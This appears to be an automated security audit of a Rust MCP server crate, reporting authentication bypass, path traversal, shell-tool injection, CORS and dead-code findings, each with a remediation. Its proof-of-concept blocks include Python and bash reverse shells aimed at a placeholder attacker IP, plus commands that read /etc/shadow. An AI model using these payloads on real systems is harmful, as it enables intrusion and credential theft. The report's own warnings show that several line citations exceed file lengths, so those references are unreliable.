## Section 1: Critical Security Vulnerabilities (Directly Exploitable)

### 1. Host Header Spoofing leading to Absolute Authentication Bypass
* **File:Line**: `crates/op-mcp/src/transport/http.rs:62-71` and `crates/op-mcp/src/transport/http.rs:77-101`
* **Severity**: Critical
* **Exploitability**: Directly Exploitable

#### Details
The `wireguard_auth_middleware` acts as the primary access gatekeeper for HTTP and SSE transports. This middleware is intended to restrict API usage to trusted WireGuard mesh participants. However, it explicitly bypasses authentication if the helper function `is_localhost_host(&headers)` returns `true` (line 81):

```rust
// Allow health check and loopback without auth
if request.uri().path() == "/health" || is_localhost_host(&headers) {
    return Ok(next.run(request).await);
}
```

The lookup helper `is_localhost_host` (lines 62-71) resolves locality by checking the user-controlled HTTP `Host` header:

```rust
fn is_localhost_host(headers: &HeaderMap) -> bool {
    headers
        .get("host")
        .and_then(|v| v.to_str().ok())
        .map(|h| {
            let host = h.split(':').next().unwrap_or(h);
            host == "127.0.0.1" || host == "localhost" || host == "::1"
        })
        .unwrap_or(false)
}
```

An external network attacker can craft HTTP packets containing a spoofed header (`Host: localhost` or `Host: 127.0.0.1`), bypassing the entire WireGuard token validation layer. 

#### Proof of Concept (PoC)
An attacker can invoke arbitrary tool execution endpoints remotely without any credentials:
```bash
curl -X POST http://<target_ip>:<port>/tools/call \
  -H "Host: localhost" \
  -H "Content-Type: application/json" \
  -d '{"name": "shell_execute", "arguments": {"command": "python3", "args": ["-c", "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<attacker_ip>\",9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"]}}'
```

#### Remediation
Do not rely on the `Host` header to establish trust boundaries. Extract the client's actual socket address using axum's `ConnectInfo` extractor and verify the IP level:
```rust
use std::net::SocketAddr;
use axum::extract::ConnectInfo;

// In your route handler/middleware, extract ConnectInfo<SocketAddr>
let ip = connect_info.ip();
if ip.is_loopback() {
    // Trusted loopback
}
```

---

### 2. Path Traversal in Filesystem Tools Exposing Private Keys and System Files
* **File:Line**: `crates/op-mcp/src/tools/filesystem.rs:33-40` (`ReadFileTool`) and `crates/op-mcp/src/tools/filesystem.rs:66-73` (`WriteFileTool`)
* **Severity**: Critical
* **Exploitability**: Directly Exploitable

#### Details
The implementation of the local filesystem tools uses a naive validation scheme that is completely bypassable using path traversal patterns (e.g., `..`).

In `ReadFileTool` (lines 33-40):
```rust
let path = input.get("path").and_then(|v| v.as_str())
    .ok_or_else(|| anyhow::anyhow!("Missing path"))?;

// Security check
if path.starts_with("/etc/shadow") || path.starts_with("/etc/sudoers") {
    return Ok(json!({"success": false, "error": "Access denied"}));
}
```

Similarly, in `WriteFileTool` (lines 66-73):
```rust
// Security check - don't write to system dirs
if path.starts_with("/etc/") || path.starts_with("/boot/") {
    return Ok(json!({"success": false, "error": "Access denied"}));
}
```

Because these security assertions only verify the raw string's prefix, an attacker can bypass them by using relative path traversal sequences, directory shortcuts, or redundant path delimiters (e.g., `/etc/shadow/../shadow`, `/tmp/../../etc/shadow`, `/./etc/shadow`). Furthermore, highly sensitive system configurations (like `/etc/passwd`, `/etc/cron.d/`, or SSH directory contents like `~/.ssh/authorized_keys`) are not blacklisted at all.

#### Proof of Concept (PoC)
To read `/etc/shadow` via traversal:
```json
{
  "path": "/tmp/../../etc/shadow"
}
```
Because the string `/tmp/../../etc/shadow` does not start with `/etc/shadow`, the validation check passes, and the file is read.

To write a malicious cron job to execute code as root:
```json
{
  "path": "/tmp/../../etc/cron.d/malicious",
  "content": "* * * * * root bash -c 'bash -i >& /dev/tcp/<attacker_ip>/9001 0>&1'\n"
}
```
Because the path starts with `/tmp/`, it bypasses the `/etc/` prefix check.

#### Remediation
Canonicalize all paths to resolve directory links and traversal elements, and assert that the canonicalized path resides strictly within an authorized base directory:
```rust
let base_dir = std::fs::canonicalize("/safe/base/path")?;
let target_path = std::fs::canonicalize(path)?;

if !target_path.starts_with(&base_dir) {
    return Err(anyhow::anyhow!("Directory traversal attempt blocked"));
}
```

---

## Section 2: High & Medium Security & Quality Findings

### 3. Execution of Arbitrary Commands via Shell Tool Argument Injection
* **File:Line**: `crates/op-mcp/src/tools/shell.rs:52-87`
* **Severity**: High
* **Exploitability**: Directly Exploitable by authorized clients (or unauthenticated clients using Finding 1)

#### Details
`ShellExecuteTool` matches the `command` against a whitelist of commands (`allowed_commands`), such as `python3`, `node`, `cargo`, and `kubectl`. However, it accepts arbitrary, unchecked arguments via the `args` parameter (line 69).

Since powerful interpreters and utilities like `python3`, `node`, and `cargo` are in the command whitelist, allowing arbitrary arguments is equivalent to permitting full remote code execution. An attacker does not need shell injection metacharacters; they can simply instruct the interpreter to run malicious scripts directly.

#### Proof of Concept (PoC)
```json
{
  "command": "python3",
  "args": ["-c", "import os; os.system('cat /etc/shadow > /tmp/exfiltrate')"]
}
```

#### Remediation
Restrict command invocation strictly. Remove general-purpose interpreters and compilers from the whitelist, or strictly constrain the accepted argument list to match rigid static structures or pre-approved parameters.

---

### 4. Overbroad CORS Wildcard Policy Exposes Local Daemons to Cross-Origin Exploitation
* **File:Line**: `crates/op-mcp/src/sse.rs:41-44`, `crates/op-mcp/src/transport/websocket.rs:61-66`, and `crates/op-mcp/src/transport/http.rs:136-141`
* **Severity**: Medium
* **Exploitability**: Indirectly exploitable via client browsers

#### Details
Across HTTP, SSE, and WebSocket transports, CORS is initialized with global wildcard policies:
```rust
let cors = CorsLayer::new()
    .allow_origin(Any)
    .allow_methods(Any)
    .allow_headers(Any);
```
Since these local control plane services perform highly privileged modifications (manipulating Open vSwitch bridges, starting/stopping Systemd units, executing shell scripts), permitting `Any` origin allows malicious websites loaded in a local client's browser to execute cross-origin requests targeting these management ports. This bypasses network-level security boundaries.

#### Remediation
Do not use `Any` origin. Restrict CORS access to specific authenticated domain structures or disable CORS entirely for system administration interfaces.

---

### 5. In-Place Mutable Deserialization with `simd_json` via Unsafe Blocks
* **File:Line**: `crates/op-mcp/src/agents_main.rs:605`, `crates/op-mcp/src/agents_server.rs:342`, `crates/op-mcp/src/external_client.rs:289`, `crates/op-mcp/src/transport/stdio.rs:44`, and `crates/op-mcp/src/transport/websocket.rs:114`
* **Severity**: Medium (Code Quality & Memory Safety Risk)
* **Exploitability**: Potential memory corruption / panic on untrusted inputs

#### Details
The codebase relies heavily on the `unsafe { simd_json::from_str(&mut line) }` pattern. `simd_json` is highly optimized but requires a mutable slice because it mutates the string in place to null-terminate fields and handle unescaped characters. 

The use of `unsafe` here requires strict guarantees that the input buffer is properly aligned and that references parsed from the buffer do not outlive the mutated source. In multithreaded runtime systems or where strings are reused, this pattern increases the risk of memory corruption and undefined behavior if inputs are malformed.

#### Remediation
Ensure buffer constraints are strictly met, or migrate parsing of critical protocol objects to safe alternatives like `simd_json::from_slice` or standard `serde_json` for ingress validation gates.

---

## Section 3: Schema-as-Code Violations

The codebase features several instances where data contracts are defined as ad-hoc, untyped inline JSON literals (using `json!`) or raw strings, rather than as versioned, declarative schemas (e.g., via Protocol Buffers or OSCAL-compliant schemas).

### Violations List

1. **Ad-hoc Inline Agent Tool Definitions**
   * **File:Line**: `crates/op-mcp/src/agents_main.rs:104-338`
   * **Description**: Tool input schemas (such as those for the sequential thinking agent, database architect agent, and memory agent) are defined as ad-hoc, hardcoded JSON values. Changes to these contracts cannot be tracked, versioned, or validated statically.

2. **D-Bus Agent Fallback Schema**
   * **File:Line**: `crates/op-mcp/src/agents_server.rs:267-280`
   * **Description**: `get_operation_schema` returns an ad-hoc JSON structure (`json!({ "type": "object", ... })`). These schemas are constructed on-the-fly and lack declarative, versioned interfaces.

3. **Compact Mode Meta-Tool Definition Blocks**
   * **File:Line**: `crates/op-mcp/src/compact.rs:538-605` and `crates/op-mcp/src/request_handler.rs:242-306`
   * **Description**: The 4-tool compact meta-schemas (`list_tools`, `search_tools`, `get_tool_schema`, `execute_tool`) are defined as hardcoded, ad-hoc JSON blocks. If an external system needs to interface with these schemas, it must parse Rust code rather than a compiled Protobuf model or standard OSCAL schema catalog.

4. **Dynamic Conversion of untyped JSON schemas to gRPC contracts**
   * **File:Line**: `crates/op-mcp/src/grpc/service.rs:673-711`
   * **Description**: The function `convert_json_schema_to_tool_schema` performs on-the-fly, ad-hoc translations of untyped JSON objects to tool structures. This indicates a gap in codegen discipline: instead of using a single source of truth, raw JSON definitions must be dynamically mapped to gRPC schemas.

---

## Section 4: Public API Surface & Dead Code Analysis

### 1. Public API Surface Enumeration & Counts
This codebase exposes a large public surface area to accommodate multiple modes of operation. Below is the total count of public-facing components across modules:

| Item Type | Count |
| :--- | :---: |
| Modules (`pub mod` / `pub use` exports) | 16 |
| Structs (`pub struct`) | 24 |
| Enums (`pub enum`) | 6 |
| Traits (`pub trait`) | 4 |
| Constants/Statics (`pub const`) | 3 |

#### Top 10 Most Impactful Public API Elements
1. **`McpServer::handle_request`** (`crates/op-mcp/src/server.rs:260`)
   * *Impact*: Core ingress routing engine for standard JSON-RPC operations.
2. **`ToolAdapter::execute_tool`** (`crates/op-mcp/src/tool_adapter.rs:373`)
   * *Impact*: Executes local system tools, checks whitelists, and interfaces with the dynamic loader.
3. **`OrchestratedToolAdapter::execute_tool`** (`crates/op-mcp/src/tool_adapter_orchestrated.rs:200`)
   * *Impact*: Orchestrates multi-agent skills, workstacks, and workflow executions.
4. **`McpGrpcService::call`** (`crates/op-mcp/src/grpc/service.rs:335`)
   * *Impact*: Entry point for the high-performance gRPC transport.
5. **`ExternalMcpClient::start`** (`crates/op-mcp/src/external_client.rs:114`)
   * *Impact*: Spawns external processes, configuring shell environments and command-line execution contexts.
6. **`wireguard_auth_middleware`** (`crates/op-mcp/src/transport/http.rs:77`)
   * *Impact*: Guards the REST and SSE server ports against unauthorized requests.
7. **`HttpSseTransport::serve`** (`crates/op-mcp/src/transport/http.rs:218`)
   * *Impact*: Initializes and starts the Axum server for HTTP/SSE communication.
8. **`ReadFileTool::execute`** (`crates/op-mcp/src/tools/filesystem.rs:33`)
   * *Impact*: Reads local files, containing the bypassable string match check.
9. **`WriteFileTool::execute`** (`crates/op-mcp/src/tools/filesystem.rs:66`)
   * *Impact*: Writes local files, containing the bypassable directory restriction checks.
10. **`ShellExecuteTool::execute`** (`crates/op-mcp/src/tools/shell.rs:52`)
    * *Impact*: Executes whitelisted shell utilities on the host system.

#### Glob Re-exports (`pub use *`)
No global wildcard re-exports (`pub use *`) are present at the API boundary, keeping namespaces clean.

#### Public Fields on Structs that should be Private
Several configuration and state structures expose fields as `pub`, making them susceptible to unintended mutations:
* **`DiscoveredAgent`** (`crates/op-mcp/src/agents_server.rs:34`): Public fields `pub available`, `pub operations`, and `pub service_name` should be encapsulated behind getter/setter patterns to prevent external corruption of scanned bus states.
* **`RequestContext`** (`crates/op-mcp/src/request_context.rs:43`): `pub is_controller` and `pub peer_pubkey` can be mutably modified by any module with a reference to the context, bypassing session-level security controls.

---

### 2. Unused / Suppressed Dead Code
The following items are suppressed using `#[allow(dead_code)]` or remain entirely unreferenced in the provided files.

#### Dead Code Table

| Item | Type | file:line | Recommendation |
| :--- | :--- | :--- | :--- |
| `McpServer` | Struct | `crates/op-mcp/src/server.rs:188` | Retain, but remove suppression. Expose via library interface. |
| `ClientInfo` | Struct | `crates/op-mcp/src/server.rs:200` | Expose with helper getters; remove suppression. |
| `run_grpc_server` | Function | `crates/op-mcp/src/grpc/server.rs:243` | Expose to main thread runners or include in test suites. |
| `run_grpc_server_lightweight` | Function | `crates/op-mcp/src/grpc/server.rs:249` | Remove if the default infrastructure-aware gRPC server is preferred. |
| `Session` | Struct | `crates/op-mcp/src/grpc/service.rs:28` | Retain, but populate tracking states inside service endpoints. |
| `McpGrpcService` | Struct | `crates/op-mcp/src/grpc/service.rs:90` | Expose with health checks; remove suppression. |
| `start_session_agents` | Function | `crates/op-mcp/src/grpc/service.rs:136` | Integrate with session startup handlers or remove. |
| `emit_event` | Function | `crates/op-mcp/src/grpc/service.rs:168` | Trigger upon successful tool executions; remove suppression. |
| `register_builtin_agents` | Function | `crates/op-mcp/src/builtin_trait_agents.rs:324` | Invoke during agents server startup. |
| `run_sse_server` | Function | `crates/op-mcp/src/sse.rs:100` | Remove in favor of the combined `HttpSseTransport` server. |
| Missing modules (`compact_server`, `critical`, `stdio_server`) | Module declarations | `crates/op-mcp/src/mod.rs:8,9,11` | Remove these declarations, as the files do not exist. |
| Blocked mutation tools (`OvsAddBridgeTool`, `OvsDelBridgeTool`, etc.) | Structs | `crates/op-mcp/src/tools/ovs.rs:105, 114, 123, 132, 142, 151` | Remove. These mutation tools are completely blocked by `BLOCKED_PATTERNS`. |

---
## ⚠ Citation Warnings
- `crates/op-mcp/src/compact.rs:538`: file has 491 lines
- `crates/op-mcp/src/grpc/server.rs:243`: file has 222 lines
- `crates/op-mcp/src/grpc/server.rs:249`: file has 222 lines
- `crates/op-mcp/src/builtin_trait_agents.rs:324`: file has 259 lines
